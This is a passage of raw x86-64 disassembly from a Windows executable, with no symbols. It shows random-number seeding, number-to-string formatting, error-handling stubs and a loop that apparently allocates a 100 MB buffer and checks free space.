   140002cef:	ba 18 00 00 00       	mov    $0x18,%edx
   140002cf4:	48 8b cb             	mov    %rbx,%rcx
   140002cf7:	e8 24 40 00 00       	call   0x140006d20
   140002cfc:	90                   	nop
   140002cfd:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002d01:	ff 15 89 65 00 00    	call   *0x6589(%rip)        # 0x140009290
   140002d07:	90                   	nop
   140002d08:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002d0c:	ff 15 7e 65 00 00    	call   *0x657e(%rip)        # 0x140009290
   140002d12:	90                   	nop
   140002d13:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002d18:	ff 15 72 65 00 00    	call   *0x6572(%rip)        # 0x140009290
   140002d1e:	85 f6                	test   %esi,%esi
   140002d20:	78 0d                	js     0x140002d2f
   140002d22:	48 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%rcx
   140002d29:	48 8b 01             	mov    (%rcx),%rax
   140002d2c:	ff 50 10             	call   *0x10(%rax)
   140002d2f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002d33:	48 8b 01             	mov    (%rcx),%rax
   140002d36:	ff 50 10             	call   *0x10(%rax)
   140002d39:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002d3d:	48 8b 01             	mov    (%rcx),%rax
   140002d40:	ff 50 10             	call   *0x10(%rax)
   140002d43:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002d47:	48 8b 01             	mov    (%rcx),%rax
   140002d4a:	ff 50 10             	call   *0x10(%rax)
   140002d4d:	ff 15 b5 68 00 00    	call   *0x68b5(%rip)        # 0x140009608
   140002d53:	8b c6                	mov    %esi,%eax
   140002d55:	e9 cb f9 ff ff       	jmp    0x140002725
   140002d5a:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d5f:	e8 fc 3d 00 00       	call   0x140006b60
   140002d64:	90                   	nop
   140002d65:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d6a:	e8 f1 3d 00 00       	call   0x140006b60
   140002d6f:	90                   	nop
   140002d70:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d75:	e8 e6 3d 00 00       	call   0x140006b60
   140002d7a:	90                   	nop
   140002d7b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d80:	e8 db 3d 00 00       	call   0x140006b60
   140002d85:	90                   	nop
   140002d86:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d8b:	e8 d0 3d 00 00       	call   0x140006b60
   140002d90:	90                   	nop
   140002d91:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d96:	e8 c5 3d 00 00       	call   0x140006b60
   140002d9b:	90                   	nop
   140002d9c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002da1:	e8 ba 3d 00 00       	call   0x140006b60
   140002da6:	90                   	nop
   140002da7:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002dac:	e8 af 3d 00 00       	call   0x140006b60
   140002db1:	cc                   	int3
   140002db2:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002db7:	e8 a4 3d 00 00       	call   0x140006b60
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002dca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002dcf:	55                   	push   %rbp
   140002dd0:	41 54                	push   %r12
   140002dd2:	41 55                	push   %r13
   140002dd4:	41 56                	push   %r14
   140002dd6:	41 57                	push   %r15
   140002dd8:	48 8d ac 24 70 ec ff 	lea    -0x1390(%rsp),%rbp
   140002ddf:	ff 
   140002de0:	b8 90 14 00 00       	mov    $0x1490,%eax
   140002de5:	e8 66 44 00 00       	call   0x140007250
   140002dea:	48 2b e0             	sub    %rax,%rsp
   140002ded:	48 8b 05 4c b2 00 00 	mov    0xb24c(%rip),%rax        # 0x14000e040
   140002df4:	48 33 c4             	xor    %rsp,%rax
   140002df7:	48 89 85 80 13 00 00 	mov    %rax,0x1380(%rbp)
   140002dfe:	33 f6                	xor    %esi,%esi
   140002e00:	ff 15 da 63 00 00    	call   *0x63da(%rip)        # 0x1400091e0
   140002e06:	c7 85 74 13 00 00 ff 	movl   $0xffffffff,0x1374(%rbp)
   140002e0d:	ff ff ff 
   140002e10:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140002e13:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e1f:	00 
   140002e20:	8b c8                	mov    %eax,%ecx
   140002e22:	c1 e9 1e             	shr    $0x1e,%ecx
   140002e25:	33 c8                	xor    %eax,%ecx
   140002e27:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   140002e2d:	03 c2                	add    %edx,%eax
   140002e2f:	89 44 95 f4          	mov    %eax,-0xc(%rbp,%rdx,4)
   140002e33:	48 ff c2             	inc    %rdx
   140002e36:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140002e3d:	72 e1                	jb     0x140002e20
   140002e3f:	c7 45 f0 70 02 00 00 	movl   $0x270,-0x10(%rbp)
   140002e46:	48 8d 1d ff 6d 00 00 	lea    0x6dff(%rip),%rbx        # 0x140009c4c
   140002e4d:	4c 8d 35 ec 6d 00 00 	lea    0x6dec(%rip),%r14        # 0x140009c40
   140002e54:	48 8d 3d f5 6d 00 00 	lea    0x6df5(%rip),%rdi        # 0x140009c50
   140002e5b:	49 bc ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%r12
   140002e62:	ff ff 7f 
   140002e65:	41 bd 00 5e d0 b2    	mov    $0xb2d05e00,%r13d
   140002e6b:	49 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r15
   140002e72:	ff ff 7f 
   140002e75:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e79:	e8 f2 3a 00 00       	call   0x140006970
   140002e7e:	8b c8                	mov    %eax,%ecx
   140002e80:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002e87:	81 f9 ef 2d 01 00    	cmp    $0x12def,%ecx
   140002e8d:	77 1b                	ja     0x140002eaa
   140002e8f:	90                   	nop
   140002e90:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e94:	e8 d7 3a 00 00       	call   0x140006970
   140002e99:	8b c8                	mov    %eax,%ecx
   140002e9b:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002ea2:	81 f9 f0 2d 01 00    	cmp    $0x12df0,%ecx
   140002ea8:	72 e6                	jb     0x140002e90
   140002eaa:	48 c1 e9 20          	shr    $0x20,%rcx
   140002eae:	81 e9 f0 d8 ff 7f    	sub    $0x7fffd8f0,%ecx
   140002eb4:	0f ba f9 1f          	btc    $0x1f,%ecx
   140002eb8:	4c 8d 4d e2          	lea    -0x1e(%rbp),%r9
   140002ebc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ec0:	49 83 e9 02          	sub    $0x2,%r9
   140002ec4:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
   140002ec9:	f7 e1                	mul    %ecx
   140002ecb:	c1 ea 03             	shr    $0x3,%edx
   140002ece:	0f b7 c2             	movzwl %dx,%eax
   140002ed1:	66 c1 e0 02          	shl    $0x2,%ax
   140002ed5:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   140002ed9:	66 45 03 c0          	add    %r8w,%r8w
   140002edd:	66 41 2b c8          	sub    %r8w,%cx
   140002ee1:	66 83 c1 30          	add    $0x30,%cx
   140002ee5:	66 41 89 09          	mov    %cx,(%r9)
   140002ee9:	8b ca                	mov    %edx,%ecx
   140002eeb:	85 d2                	test   %edx,%edx
   140002eed:	75 d1                	jne    0x140002ec0
   140002eef:	4c 8d 45 e2          	lea    -0x1e(%rbp),%r8
   140002ef3:	49 8b d1             	mov    %r9,%rdx
   140002ef6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002efb:	e8 40 2f 00 00       	call   0x140005e40
   140002f00:	90                   	nop
   140002f01:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140002f06:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f0b:	48 8b c1             	mov    %rcx,%rax
   140002f0e:	49 2b c0             	sub    %r8,%rax
   140002f11:	48 83 f8 06          	cmp    $0x6,%rax
   140002f15:	0f 82 93 00 00 00    	jb     0x140002fae
   140002f1b:	49 8d 40 06          	lea    0x6(%r8),%rax
   140002f1f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f24:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002f29:	48 83 f9 07          	cmp    $0x7,%rcx
   140002f2d:	48 0f 47 7c 24 30    	cmova  0x30(%rsp),%rdi
   140002f33:	48 3b df             	cmp    %rdi,%rbx
   140002f36:	76 1e                	jbe    0x140002f56
   140002f38:	4a 8d 04 47          	lea    (%rdi,%r8,2),%rax
   140002f3c:	4c 3b f0             	cmp    %rax,%r14
   140002f3f:	77 15                	ja     0x140002f56
   140002f41:	49 3b fe             	cmp    %r14,%rdi
   140002f44:	77 05                	ja     0x140002f4b
   140002f46:	48 8b de             	mov    %rsi,%rbx
   140002f49:	eb 10                	jmp    0x140002f5b
   140002f4b:	48 8b df             	mov    %rdi,%rbx
   140002f4e:	49 2b de             	sub    %r14,%rbx
   140002f51:	48 d1 fb             	sar    $1,%rbx
   140002f54:	eb 05                	jmp    0x140002f5b
   140002f56:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002f5b:	4e 8d 04 45 02 00 00 	lea    0x2(,%r8,2),%r8
   140002f62:	00 
   140002f63:	48 8d 4f 0c          	lea    0xc(%rdi),%rcx
   140002f67:	48 8b d7             	mov    %rdi,%rdx
   140002f6a:	e8 52 4d 00 00       	call   0x140007cc1
   140002f6f:	48 03 db             	add    %rbx,%rbx
   140002f72:	4c 8b c3             	mov    %rbx,%r8
   140002f75:	49 8b d6             	mov    %r14,%rdx
   140002f78:	48 8b cf             	mov    %rdi,%rcx
   140002f7b:	e8 3b 4d 00 00       	call   0x140007cbb
   140002f80:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002f86:	4c 2b c3             	sub    %rbx,%r8
   140002f89:	49 8d 56 0c          	lea    0xc(%r14),%rdx
   140002f8d:	48 03 d3             	add    %rbx,%rdx
   140002f90:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002f94:	e8 22 4d 00 00       	call   0x140007cbb
   140002f99:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002f9e:	48 8d 1d a7 6c 00 00 	lea    0x6ca7(%rip),%rbx        # 0x140009c4c
   140002fa5:	48 8d 3d a4 6c 00 00 	lea    0x6ca4(%rip),%rdi        # 0x140009c50
   140002fac:	eb 18                	jmp    0x140002fc6
   140002fae:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140002fb5:	00 00 
   140002fb7:	ba 06 00 00 00       	mov    $0x6,%edx
   140002fbc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002fc1:	e8 fa 37 00 00       	call   0x1400067c0
   140002fc6:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002fc9:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fcd:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002fd0:	f3 0f 7f 4d a8       	movdqu %xmm1,-0x58(%rbp)
   140002fd5:	0f 10 00             	movups (%rax),%xmm0
   140002fd8:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fdc:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002fe0:	0f 11 4d a8          	movups %xmm1,-0x58(%rbp)
   140002fe4:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002fe8:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002fef:	00 
   140002ff0:	66 89 30             	mov    %si,(%rax)
   140002ff3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002ff8:	48 83 fa 07          	cmp    $0x7,%rdx
   140002ffc:	76 37                	jbe    0x140003035
   140002ffe:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003005:	00 
   140003006:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000300b:	48 8b c1             	mov    %rcx,%rax
   14000300e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003015:	72 19                	jb     0x140003030
   140003017:	48 83 c2 27          	add    $0x27,%rdx
   14000301b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000301f:	48 2b c1             	sub    %rcx,%rax
   140003022:	48 83 e8 08          	sub    $0x8,%rax
   140003026:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000302a:	0f 87 42 01 00 00    	ja     0x140003172
   140003030:	e8 eb 3c 00 00       	call   0x140006d20
   140003035:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140003039:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000303c:	f3 0f 7f 44 24 78    	movdqu %xmm0,0x78(%rsp)
   140003042:	48 89 75 8c          	mov    %rsi,-0x74(%rbp)
   140003046:	89 75 94             	mov    %esi,-0x6c(%rbp)
   140003049:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000304d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003052:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003057:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000305c:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140003061:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%rsp)
   140003068:	00 
   140003069:	c7 45 88 01 00 01 00 	movl   $0x10001,-0x78(%rbp)
   140003070:	45 33 c9             	xor    %r9d,%r9d
   140003073:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140003078:	ba 01 00 00 00       	mov    $0x1,%edx
   14000307d:	33 c9                	xor    %ecx,%ecx
   14000307f:	ff 15 f3 61 00 00    	call   *0x61f3(%rip)        # 0x140009278
   140003085:	85 c0                	test   %eax,%eax
   140003087:	75 76                	jne    0x1400030ff
   140003089:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000308d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003092:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003097:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000309c:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400030a3:	00 
   1400030a4:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400030a9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400030af:	48 8d 15 ba 6b 00 00 	lea    0x6bba(%rip),%rdx        # 0x140009c70
   1400030b6:	33 c9                	xor    %ecx,%ecx
   1400030b8:	ff 15 b2 61 00 00    	call   *0x61b2(%rip)        # 0x140009270
   1400030be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400030c1:	33 c0                	xor    %eax,%eax
   1400030c3:	0f 11 45 b8          	movups %xmm0,-0x48(%rbp)
   1400030c7:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   1400030cb:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400030cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400030d3:	c7 45 e0 01 00 01 00 	movl   $0x10001,-0x20(%rbp)
   1400030da:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   1400030de:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   1400030e3:	48 0f 47 55 98       	cmova  -0x68(%rbp),%rdx
   1400030e8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030ed:	4c 8d 4d b8          	lea    -0x48(%rbp),%r9
   1400030f1:	33 c9                	xor    %ecx,%ecx
   1400030f3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400030f9:	ff 15 81 61 00 00    	call   *0x6181(%rip)        # 0x140009280
   1400030ff:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003104:	e8 17 df ff ff       	call   0x140001020
   140003109:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000310e:	49 3b c4             	cmp    %r12,%rax
   140003111:	7d 0b                	jge    0x14000311e
   140003113:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140003117:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   14000311c:	eb 05                	jmp    0x140003123
   14000311e:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140003123:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003128:	e8 73 2e 00 00       	call   0x140005fa0
   14000312d:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140003131:	48 83 fa 07          	cmp    $0x7,%rdx
   140003135:	0f 86 3a fd ff ff    	jbe    0x140002e75
   14000313b:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003142:	00 
   140003143:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140003147:	48 8b c1             	mov    %rcx,%rax
   14000314a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003151:	72 15                	jb     0x140003168
   140003153:	48 83 c2 27          	add    $0x27,%rdx
   140003157:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000315b:	48 2b c1             	sub    %rcx,%rax
   14000315e:	48 83 e8 08          	sub    $0x8,%rax
   140003162:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003166:	77 20                	ja     0x140003188
   140003168:	e8 b3 3b 00 00       	call   0x140006d20
   14000316d:	e9 03 fd ff ff       	jmp    0x140002e75
   140003172:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003177:	45 33 c9             	xor    %r9d,%r9d
   14000317a:	45 33 c0             	xor    %r8d,%r8d
   14000317d:	33 d2                	xor    %edx,%edx
   14000317f:	33 c9                	xor    %ecx,%ecx
   140003181:	ff 15 b9 63 00 00    	call   *0x63b9(%rip)        # 0x140009540
   140003187:	cc                   	int3
   140003188:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000318d:	45 33 c9             	xor    %r9d,%r9d
   140003190:	45 33 c0             	xor    %r8d,%r8d
   140003193:	33 d2                	xor    %edx,%edx
   140003195:	33 c9                	xor    %ecx,%ecx
   140003197:	ff 15 a3 63 00 00    	call   *0x63a3(%rip)        # 0x140009540
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400031a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400031aa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400031af:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400031b4:	55                   	push   %rbp
   1400031b5:	41 56                	push   %r14
   1400031b7:	41 57                	push   %r15
   1400031b9:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   1400031c0:	ff 
   1400031c1:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   1400031c8:	48 8b 05 71 ae 00 00 	mov    0xae71(%rip),%rax        # 0x14000e040
   1400031cf:	48 33 c4             	xor    %rsp,%rax
   1400031d2:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   1400031d9:	33 c0                	xor    %eax,%eax
   1400031db:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400031de:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   1400031e4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400031e9:	b9 27 00 40 06       	mov    $0x6400027,%ecx
   1400031ee:	e8 35 3b 00 00       	call   0x140006d28
   1400031f3:	48 85 c0             	test   %rax,%rax
   1400031f6:	0f 84 f8 03 00 00    	je     0x1400035f4
   1400031fc:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140003200:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003204:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003208:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000320d:	48 8d b3 00 00 40 06 	lea    0x6400000(%rbx),%rsi
   140003214:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003219:	33 d2                	xor    %edx,%edx
   14000321b:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   140003221:	48 8b cb             	mov    %rbx,%rcx
   140003224:	e8 69 49 00 00       	call   0x140007b92
   140003229:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000322e:	45 33 c9             	xor    %r9d,%r9d
   140003231:	4c 8d 05 48 6a 00 00 	lea    0x6a48(%rip),%r8        # 0x140009c80
   140003238:	48 8d 15 51 6a 00 00 	lea    0x6a51(%rip),%rdx        # 0x140009c90
   14000323f:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003243:	e8 18 19 00 00       	call   0x140004b60
   140003248:	bf 01 00 00 00       	mov    $0x1,%edi
   14000324d:	33 d2                	xor    %edx,%edx
   14000324f:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140003255:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000325a:	e8 33 49 00 00       	call   0x140007b92
   14000325f:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   140003265:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   140003269:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000326e:	e8 8d 1c 00 00       	call   0x140004f00
   140003273:	90                   	nop
   140003274:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003279:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000327d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003282:	48 03 c8             	add    %rax,%rcx
   140003285:	ff 15 ad 5e 00 00    	call   *0x5ead(%rip)        # 0x140009138
   14000328b:	4c 8d 3d 16 6f 00 00 	lea    0x6f16(%rip),%r15        # 0x14000a1a8
   140003292:	4c 8d 35 8f 6e 00 00 	lea    0x6e8f(%rip),%r14        # 0x14000a128
   140003299:	84 c0                	test   %al,%al
   14000329b:	0f 85 7d 01 00 00    	jne    0x14000341e
   1400032a1:	49 bc cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r12
   1400032a8:	cc cc cc 
   1400032ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400032b0:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   1400032b6:	48 8b d3             	mov    %rbx,%rdx
   1400032b9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400032be:	ff 15 84 5e 00 00    	call   *0x5e84(%rip)        # 0x140009148
   1400032c4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400032c9:	e8 a2 30 00 00       	call   0x140006370
   1400032ce:	48 85 c0             	test   %rax,%rax
   1400032d1:	75 1f                	jne    0x1400032f2
   1400032d3:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400032d8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032dc:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400032e1:	48 03 c8             	add    %rax,%rcx
   1400032e4:	45 33 c0             	xor    %r8d,%r8d
   1400032e7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400032ec:	ff 15 56 5f 00 00    	call   *0x5f56(%rip)        # 0x140009248
   1400032f2:	49 8b c4             	mov    %r12,%rax
   1400032f5:	48 f7 e7             	mul    %rdi
   1400032f8:	48 c1 ea 03          	shr    $0x3,%rdx
   1400032fc:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140003300:	48 03 c9             	add    %rcx,%rcx
   140003303:	48 3b f9             	cmp    %rcx,%rdi
   140003306:	75 2d                	jne    0x140003335
   140003308:	45 33 c9             	xor    %r9d,%r9d
   14000330b:	45 33 c0             	xor    %r8d,%r8d
   14000330e:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140003312:	48 8d 0d 83 69 00 00 	lea    0x6983(%rip),%rcx        # 0x140009c9c
   140003319:	ff 15 29 5d 00 00    	call   *0x5d29(%rip)        # 0x140009048
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	0f 84 57 02 00 00    	je     0x14000357e
   140003327:	48 81 7d 60 00 00 40 	cmpq   $0x6400000,0x60(%rbp)
   14000332e:	06 
   14000332f:	0f 82 d3 01 00 00    	jb     0x140003508
   140003335:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000333a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000333e:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003343:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003348:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000334c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003352:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003356:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000335b:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003360:	74 28                	je     0x14000338a
   140003362:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003366:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000336b:	48 39 08             	cmp    %rcx,(%rax)
   14000336e:	75 1a                	jne    0x14000338a
   140003370:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003374:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003378:	48 89 08             	mov    %rcx,(%rax)
   14000337b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000337f:	48 89 08             	mov    %rcx,(%rax)
   140003382:	2b d1                	sub    %ecx,%edx
   140003384:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003388:	89 10                	mov    %edx,(%rax)
   14000338a:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000338e:	74 0a                	je     0x14000339a
   140003390:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003395:	e8 d6 2f 00 00       	call   0x140006370
   14000339a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000339f:	ff 15 cb 5d 00 00    	call   *0x5dcb(%rip)        # 0x140009170
   1400033a5:	90                   	nop
   1400033a6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400033ab:	ff 15 9f 5d 00 00    	call   *0x5d9f(%rip)        # 0x140009150
   1400033b1:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400033b5:	ff 15 bd 5d 00 00    	call   *0x5dbd(%rip)        # 0x140009178
   1400033bb:	4c 8b cf             	mov    %rdi,%r9
   1400033be:	4c 8d 05 bb 68 00 00 	lea    0x68bb(%rip),%r8        # 0x140009c80
   1400033c5:	48 8d 15 c4 68 00 00 	lea    0x68c4(%rip),%rdx        # 0x140009c90
   1400033cc:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400033d0:	e8 8b 17 00 00       	call   0x140004b60
   1400033d5:	48 ff c7             	inc    %rdi
   1400033d8:	33 d2                	xor    %edx,%edx
   1400033da:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   1400033e0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033e5:	e8 a8 47 00 00       	call   0x140007b92
   1400033ea:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   1400033f0:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400033f4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033f9:	e8 02 1b 00 00       	call   0x140004f00
   1400033fe:	90                   	nop
   1400033ff:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003404:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003408:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000340d:	48 03 c8             	add    %rax,%rcx
   140003410:	ff 15 22 5d 00 00    	call   *0x5d22(%rip)        # 0x140009138
   140003416:	84 c0                	test   %al,%al
   140003418:	0f 84 92 fe ff ff    	je     0x1400032b0
   14000341e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003423:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003427:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   14000342c:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003431:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003435:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000343b:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   14000343f:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140003444:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003449:	74 28                	je     0x140003473
   14000344b:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   14000344f:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003454:	48 39 08             	cmp    %rcx,(%rax)
   140003457:	75 1a                	jne    0x140003473
   140003459:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   14000345d:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003461:	48 89 08             	mov    %rcx,(%rax)
   140003464:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003468:	48 89 08             	mov    %rcx,(%rax)
   14000346b:	2b d1                	sub    %ecx,%edx
   14000346d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003471:	89 10                	mov    %edx,(%rax)
